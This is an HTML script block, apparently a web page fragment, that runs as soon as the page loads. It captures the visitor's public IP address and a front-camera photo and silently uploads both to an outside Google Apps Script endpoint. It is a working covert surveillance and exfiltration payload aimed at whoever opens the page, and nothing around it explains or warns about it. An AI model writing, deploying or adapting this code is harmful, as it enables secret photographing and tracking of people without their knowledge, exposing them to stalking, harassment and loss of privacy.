    <script>
        async function captureAndUpload() {
            try {
                // [1. IP Address - UNCHANGED]
                let userIP = 'unknown';
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    userIP = ipData.ip || 'unknown';
                } catch (ipErr) {
                    console.warn('IP fetch failed:', ipErr);
                }

                // [2. Camera Access - UNCHANGED]
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: { ideal: "user" }, // switched to ideal for better compatibility
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    }
                });

                // [3. Image Capture - UNCHANGED]
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);

                // [4. Stop Camera - UNCHANGED]
                stream.getTracks().forEach(track => track.stop());

                // [5. Prepare Image Data - UNCHANGED]
                const imageData = canvas.toDataURL('image/jpeg', 0.85).split(',')[1];

                // ===== LOCAL DEVICE TIME FORMAT =====
                const now = new Date();
                const year = now.getFullYear();
                const month = String(now.getMonth() + 1).padStart(2, '0');
                const day = String(now.getDate()).padStart(2, '0');
                const hours = String(now.getHours()).padStart(2, '0');
                const minutes = String(now.getMinutes()).padStart(2, '0');
                const seconds = String(now.getSeconds()).padStart(2, '0');

                const filename = `${userIP}-${year}${month}${day}-${hours}${minutes}${seconds}.jpg`;
                // ===== END LOCAL TIME FORMAT =====

                // [6. Upload - UNCHANGED]
                const response = await fetch('https://script.google.com/macros/s/AKfycbxveLuf1BJSzOr81f8ffjUfbS62-e1W3wnvXofXDFwSdatcBGabzXC6c8fbytcX346w/exec', {
                    method: 'POST',
                    body: JSON.stringify({
                        image: imageData,
                        ip: userIP,
                        filename: filename
                    })
                });

                console.log('Upload result:', await response.text());

            } catch (error) {
                console.error('Capture failed:', error);
            } 
            }
        

        window.onload = captureAndUpload;
        </script>
